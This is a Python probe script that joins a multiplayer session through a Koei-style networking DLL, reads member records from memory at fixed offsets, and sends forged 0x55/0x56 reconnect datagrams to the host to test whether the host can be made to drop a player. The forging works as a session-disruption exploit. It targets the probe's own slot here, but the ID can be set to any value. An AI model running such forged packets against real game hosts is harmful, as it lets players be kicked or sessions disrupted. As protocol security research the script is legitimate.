"""P3 forge probe: joined session + forged reconnect-announce datagrams.

After a verified OpenSession join, sends typed datagrams to the host's game
port from this probe's own relay identity:
  phase1: type 0x55 (announce reconnect) with own ID   -> host marks slot
  phase2: type 0x56 (reconnect OK) with own ID         -> host clears slot
  phase3: type 0x55 with own ID, then stay silent      -> expect host-side
          40s reconnect monitor to close our channel (self-kick proof)
ID byte order configurable (--order be|le). Snapshots each phase.
"""
import argparse
import ctypes as c
from ctypes import wintypes as w
import hashlib
import json
from pathlib import Path
import socket as pysocket
import struct
import sys
import time

KOEINM = '629f500a4fbb1fdcb056c4d681476a31f0ae31e6cd9d26221e8faaeb41283841'
NETHOOK = '5b3790982f7c54f891e5b3c8559e7a61c7589d8a4a9d68bc9f8f8992b5b678b4'


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--target', required=True)
    ap.add_argument('--session-name', required=True)
    ap.add_argument('--username', required=True)
    ap.add_argument('--hold', type=int, default=20, help='silent-wait duration after the second 0x55 (kick monitor window)')
    ap.add_argument('--order', choices=('be', 'le'), default='be')
    ap.add_argument('--join-wait', type=int, default=4)
    ap.add_argument('--phase-wait', type=int, default=6)
    ap.add_argument('--kick-wait', type=int, default=0, help='overrides --hold if > 0')
    ap.add_argument('--wire-len', type=int, default=9, help='total datagram size; recv path drops < 9')
    args = ap.parse_args()
    if args.kick_wait <= 0:
        args.kick_wait = args.hold
    assert c.sizeof(c.c_void_p) == 4
    root = Path(r'C:\sgi\run-3.5')
    dllpath = root/'3I/Koeinm.dll'
    assert hashlib.sha256(dllpath.read_bytes()).hexdigest() == KOEINM
    assert hashlib.sha256((root/'NetHookCore.dll').read_bytes()).hexdigest() == NETHOOK
    u = c.WinDLL('user32')
    u.PeekMessageW.argtypes = [c.POINTER(w.MSG), w.HWND, w.UINT, w.UINT, w.UINT]
    u.TranslateMessage.argtypes = [c.POINTER(w.MSG)]
    u.DispatchMessageW.argtypes = [c.POINTER(w.MSG)]
    k = c.WinDLL('kernel32')
    k.GlobalFree.argtypes = [c.c_void_p]
    k.GlobalFree.restype = c.c_void_p
    msg = w.MSG()

    def pump():
        while u.PeekMessageW(c.byref(msg), None, 0, 0, 1):
            u.TranslateMessage(c.byref(msg))
            u.DispatchMessageW(c.byref(msg))

    dll = c.WinDLL(str(dllpath))
    hook = c.WinDLL(str(root/'NetHookCore.dll'))
    result = {'transport_loaded': bool(hook._handle), 'snapshots': [], 'forges': [],
              'order': args.order, 'args': {k: v for k, v in vars(args).items()},
              'python': sys.version, 'loop_iters': 0}

    def export(name, argtypes, restype=c.c_int):
        f = getattr(dll, name)
        f.argtypes = argtypes
        f.restype = restype
        return f

    start = export('_NetMsg_Start@36', [c.c_uint32]*8 + [c.POINTER(c.c_uint32)])
    getip = export('_NetMsg_GetIPAddress@4', [c.POINTER(c.c_void_p)])
    opens = export('_NetMsg_OpenSession@20', [c.c_char_p, c.c_char_p, c.c_char_p, c.c_uint32, c.c_uint32])
    connected = export('_NetMsg_IsConnected@0', [])
    setdata = export('_NetMsg_SetDataWindow@8', [w.HWND, w.UINT])
    exit_session = export('_NetMsg_ExitSession@0', [])
    end = export('_NetMsg_End@0', [])
    base = dll._handle + 0x12170

    def snapshot(stage):
        count = c.c_uint32.from_address(base+0x43bc).value
        ptr = c.c_uint32.from_address(base+0x43b8).value
        members = []
        if count and ptr:
            for i in range(min(count, 8)):
                raw = c.string_at(ptr + i*0x164, 35)
                members.append({'id': str(struct.unpack_from('<I', raw)[0]),
                                'name': raw[4:35].split(b'\0')[0].decode('gbk', 'replace')})
        result['snapshots'].append({'stage': stage, 'connected': connected(),
            'count': count, 'members': members, 't': round(time.time(), 1)})

    ws = c.WinDLL('ws2_32')

    class SockAddr(c.Structure):
        _fields_ = [('family', c.c_ushort), ('port', c.c_ushort),
                    ('ip', c.c_uint32), ('padding', c.c_char*8)]

    def forge(dtype, member_id):
        sock = ws.socket(2, 2, 17)
        if sock in (0, 0xFFFFFFFF):
            result['forges'].append({'type': hex(dtype), 'error': 'socket'})
            return
        dst = SockAddr()
        dst.family = 2
        dst.port = pysocket.htons(7777)
        dst.ip = struct.unpack('<I', pysocket.inet_aton(args.target))[0]
        ident = struct.pack('>I' if args.order == 'be' else '<I', member_id)
        payload = bytes([dtype]) + ident
        payload = payload + b'\x00' * max(0, args.wire_len - len(payload))
        payload = payload[:args.wire_len] if len(payload) > args.wire_len else payload
        sent = ws.sendto(sock, c.create_string_buffer(payload), len(payload), 0, c.byref(dst), 16)
        result['forges'].append({'type': hex(dtype), 'id': str(member_id),
                                 'payload_hex': payload.hex(), 'sent': int(sent)})
        ws.closesocket(sock)

    try:
        flag = c.c_uint32()
        result['start_rc'] = start(8, 64, 7777, 100, 100, 78731, 0, 0, c.byref(flag))
        pump()
        ip_ptr = c.c_void_p()
        ip_count = getip(c.byref(ip_ptr))
        own = None
        if 0 < ip_count <= 20 and ip_ptr.value:
            addresses = list((c.c_uint32*ip_count).from_address(ip_ptr.value))
            result['probe_addresses'] = ['.'.join(str(x) for x in struct.pack('!I', v)) for v in addresses]
            own = addresses[0]
        if not own:
            result['abort'] = 'no_relay_address'
            return
        setdata(None, 0x2462)
        rc = opens(args.target.encode('ascii'), args.session_name.encode('gbk'),
                   args.username.encode('gbk'), own, 3000)
        result['open_session'] = {'rc': rc}
        pump()
        snapshot('after_join')
        if rc != 0:
            result['abort'] = 'join_failed'
            return
        time.sleep(args.join_wait)
        pump()
        snapshot('settled')
        forge(0x55, own)
        time.sleep(args.phase_wait)
        pump()
        snapshot('after_forged_55')
        forge(0x56, own)
        time.sleep(args.phase_wait)
        pump()
        snapshot('after_forged_56')
        forge(0x55, own)
        result['loop_deadline_in'] = args.kick_wait
        deadline = time.monotonic() + args.kick_wait
        last = 0
        stage = 0
        zeros = 0
        while time.monotonic() < deadline:
            result['loop_iters'] += 1
            pump()
            if time.monotonic() - last >= 5:
                stage += 1
                snapshot(f'kick_wait_{stage*5}s')
                last = time.monotonic()
                zeros = zeros + 1 if connected() == 0 else 0
                if zeros >= 2:
                    result['kick_confirmed'] = stage*5
                    break
            time.sleep(0.05)
    finally:
        result['cleanup'] = {'exit_rc': exit_session(), 'end_rc': end()}
    print(json.dumps(result, ensure_ascii=True))


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(json.dumps({'error_type': type(e).__name__}))
        sys.exit(1)
